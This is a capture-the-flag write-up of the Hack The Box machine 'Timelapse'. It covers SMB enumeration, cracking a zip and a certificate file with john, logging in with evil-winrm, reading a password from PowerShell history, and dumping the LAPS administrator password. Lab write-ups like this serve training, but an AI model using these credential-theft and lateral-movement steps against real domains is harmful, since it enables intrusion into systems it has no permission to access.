# Timelapse

## Machine Info

![Timelapse](./Timelapse.assets/Timelapse.png)

## Recon

### port

- dns
- kerberos, ldap
- 5986 Microsoft HTTPAPI httpd 2.0

```console
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-24 14:15:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_ssl-date: 2024-02-24T14:17:11+00:00; +7h59m33s from scanner time.
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
59641/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### domains

- `htb`, `timelapse`

- `timelapse.htb `

- `dc01.timelapse.htb`

### samba

- READ ONLY: `Shares`

```console
└─╼$ smbmap -H 10.129.97.209 -u anonymous

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.97.209:445       Name: dc01.timelapse.htb        Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        Shares                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
```

- Discover file inside `Shares`

```console
smb: \> dir Dev/*
  .                                   D        0  Tue Oct 26 03:40:06 2021
  ..                                  D        0  Tue Oct 26 03:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 23:46:42 2021

                6367231 blocks of size 4096. 1337750 blocks available
smb: \> dir HelpDesk/*
  .                                   D        0  Mon Oct 25 23:48:42 2021
  ..                                  D        0  Mon Oct 25 23:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 22:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 22:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 22:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 22:57:44 2021

                6367231 blocks of size 4096. 1337750 blocks available
```

## Foothold

### Sambda Data Leakage

Analyse `winrm_backup.zip` and crack zip file's password and pfx's password:

```console
└─╼$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:00 DONE (2024-02-24 15:06) 4.347g/s 15119Kp/s 15119Kc/s 15119KC/s surkerior..supalove
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
---------------------------------------------------------------------------------
└─╼$ john hash1 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)
1g 0:00:00:25 DONE (2024-02-24 15:22) 0.03932g/s 127083p/s 127083c/s 127083C/s thugways..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Dump key and certificate based on cracked password: `thuglegacy` -> dump private key & certificate

```console
└─╼$ openssl pkcs12 -info -in legacyy_dev_auth.pfx -out dev-enc
Enter Import Password:
MAC: sha1, Iteration 2000
MAC length: 20, salt length: 20
PKCS7 Data
Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2000
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
PKCS7 Data
Certificate bag

└─╼$ cat dev-enc
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFLTBXBgkqhkiG9w0BBQ0wSjApBgkqhkiG9w0BBQwwHAQIcD3yOjSGXBACAggA
MAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBCzUTE67JfhG7blubJh8SFeBIIE
0Ld5pSojwDK2TvnPLzYtJLhBF7di5GboM7BTypautHWvrRRCxUT+kv8r3Je67YSt
4Cwv0/2rBFfSvyZFephc+0NzD5a6pYa/Uvl2tu/l4PdQK2laZNMxd8RIrW8TfF3w
ri9YkpdJVFwAJ6UtYd8AI1tseuLotrcAWEYtJJJQbRt2bDrh8RFrq78XxF4L/YZt
x9AAKxyqt0F0dhIx79HYroN49hvKqVRmNNeL/+0o02mzrUfxw4acPexnXNhRJt87
P5abbQ70nuky/oEOXb32IMT2EkjxikyCEUXCKitdFxwxMeJ/tc7cgkVmpxPEmyya
Aj9ggBxeyql54CUyYwgCDPRqr7y7HhzYnBvpcVgprR4Hzx7ll0LfeTNQJK2jW2S+
STNuPblKGf3mOTJcliOzYmN2NlQG0p8IOYiwc/rvcLXhmP4s0cLQXV0vhm5jtPDn
4IVoQJJ0eSonMJEKr3hczPZvFRkQLEQ9dJCO+sIf+bzLDLQLy+J+0EnMwS5pnT5K
LheDbeZzPUdr3FcfK+SKUji04E1xvQCkYIDRNUHqDvcmYRZaBTGBdEj0q9pSm83j
gdtIwP8aEdbm/+Q8TR3Si4DuBaAyUSIPNM05mzsihTKqxTilw3cM0v1I7bD+ofBw
WEY1hKCJRprTN09xIO6+P0FwC97zyf5kvvfGCFZWoeoYJBEu2YpoldZ+woB9vemj
DZ268Iu7z+YXBTipF8MZ7KSu54XjMmeskSl3kpgUTMZtFknWXRO6oNeW78iTYlI0
o6KsMIQlZXDwq8SyH5/Ywab8C/iFMrp9/0U74AdOgs9e7Z+ezuC9Hr3qW6ToNfkU
bdTNexgm24z1rzZxpGD1KJvPcaqxU9nONnZo/W4vb+ehkVAj+74lABySwIAxQdSm
SOxRl+lTSZCI6NKa1rK9EQ2YQSEb+4H+J2uJ9z338/y0V8ufRx7yG+jLEjYOCEv/
SpC2FbKmqRkbOniVQMCtdF2gn90rvXDIA1Fkcy7wUjEu0wEr3XI8SS0Lb6YDOKFH
8TKakvNulNULjBmXA2kkZzMs7SiKfZxhHxuR0NDg8dTy9oRjkeW8ndLpysd07cUT
yINeFwGc/4yuaAmIKSHaHjBEq+fTs+oW094pC2SR/1oBNIaSdo7IIx9r8LvrxtRb
/G0LJ6593OrGH34OS9pKyOhygoXnPrLibwuIcPOVlLijNQHT2HaXwjqsa5gYYJzr
bX2LWTYzYRA2M6v+O0wuSTmPEOS16IESE91kNUjXJdt7l5T4VVwhfxml9BhWcMFs
YFW6pKwNG3IAxiiu1/I8Hm/WzxiKtc5/UqbvFZMy3GmAoq2b7OK0DQ79XM0XESFj
Vhz40c+d+6FnA3xzLhcusx5LjYhld1b9Y4PeHi26p9n6UEgQPPRz36FdA+4tFcL9
CmwVVBLfvhmG3GU6x0ebDZ3flnyg9vFCH1w1DwrKIJXaq7xzyeNEnTTsyZA2xBJp
Q1U69K7H6SClFSdlNlTBk+UmyK0ncMRIlui9xbitgpQrPVGTx+TCX1p/EkrCxfxl
yh6v0yJI9o+XyzCVpX4HmkP+4VwB+PfU3R4JK+Xh/NVLWQhWxOd6LWVY1173vwt7
3W6O7CjuVQu5iV/fbxSghR6GJgHff8w3HH7cJssOzoHm
-----END ENCRYPTED PRIVATE KEY-----
Bag Attributes
    localKeyID: 01 00 00 00
subject=CN = Legacyy
issuer=CN = Legacyy
-----BEGIN CERTIFICATE-----
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
-----END CERTIFICATE-----
```

```console
└─╼$ openssl pkcs12 -info -in legacyy_dev_auth.pfx -clcerts -nokeys -out dev.crt
Enter Import Password:
MAC: sha1, Iteration 2000
MAC length: 20, salt length: 20
PKCS7 Data
Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2000
PKCS7 Data
Certificate bag

└─╼$ openssl rsa -in legacyy_dev_auth.pfx -out dev.key
Enter pass phrase for PKCS12 import pass phrase:
writing RSA key
```

Use certificate & key to login using winrm:

```console
└─╼$ evil-winrm -i $IP -S -c dev.crt -k dev.key

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```

## Privilege Escalation

### legacyy -> svc_deploy

**WinPEAS output**: Powershell History with credential: `svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV`

![image-20240312031528026](./Timelapse.assets/image-20240312031528026.png)

```console
*Evil-WinRM* PS C:\Users\legacyy\desktop> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

```console
└─╼$ evil-winrm -i $IP -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
```

### svc_deploy -> admin

Enum svc_deploy user: a special group `LAPS_Readers`

```console
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 11:12:37 AM
Password expires             Never
Password changeable          10/26/2021 11:12:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 11:25:53 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

> With LAPS, the DC manages the local administrator passwords for computers on the domain. It is common to create a group of users and give them permissions to read these passwords, allowing the trusted administrators access to all the local admin passwords.
>
> ```console
> https://docs.h4rithd.com/windows/privilageesc-windows
> 
> Computers = Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
> $Computers | Sort-Object ms-Mcs-AdmPwdExpirationTime | Format-Table -AutoSize Name, DnsHostName, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
> $computers | Export-Csv -path c:\windows\temp\laps.csv" -NoTypeInformation
> ```

```console
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> $Computers = Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> $Computers | Sort-Object ms-Mcs-AdmPwdExpirationTime | Format-Table -AutoSize Name, DnsHostName, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

Name  DnsHostName        ms-Mcs-AdmPwd            ms-Mcs-AdmPwdExpirationTime
----  -----------        -------------            ---------------------------
WEB01
DEV01
DB01
DC01  dc01.timelapse.htb r5j7S@OS@vT(k.x3G8O0/S71 133536886067357881


*Evil-WinRM* PS C:\Users\svc_deploy\Documents> $computers | Export-Csv -path laps.csv -NoTypeInformation
```

```console
└─╼$ evil-winrm -i $IP -u administrator -p 'r5j7S@OS@vT(k.x3G8O0/S71' -S

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```

## Exploit Chain

port scan: smb, kerberos -> smb Shares (readable) -> encrypted zip backup of winrm -> john to crack zip & unzipped pfx -> openssl: dump private key & certificate -> legacyy priv -> credential stored inside powershell commands history -> svc_deploy inside LAPS_Readers group -> read admin password by ldap -> admin priv

## Beyond Root

### LAPS_Readers Group

Below are the main purposes and uses of the `LAPS_Readers` group:

- **Permission Restriction**: This group is specifically designed to restrict which users can read the passwords managed by LAPS. This ensures that only trusted personnel have access to these sensitive credentials.

- **Role Separation**: Within an organization, not all IT staff need access to the administrator passwords for all systems. By creating a `LAPS_Readers` group, it can be ensured that only specific roles or individuals have access to the local administrator passwords stored in Active Directory.

- **Auditing and Tracking**: By limiting password access rights to a specific group, organizations can more easily track who has accessed the passwords and when, aiding in compliance and auditing requirements.

Typically, when implementing LAPS in Active Directory, the following steps are taken:

1. Create a `LAPS_Readers` user group and add the users or other groups that need to read the passwords to it.
2. Modify the permissions of the computer objects managed by LAPS to allow members of the `LAPS_Readers` group to read the stored password attributes.
3. Users within the organization who need access to these passwords are instructed to join the group.

This approach provides a structured and controllable method for managing access to local administrator passwords, while promoting the implementation of the principle of least privilege, meaning users are granted only the permissions they need to complete their work, no more and no less.
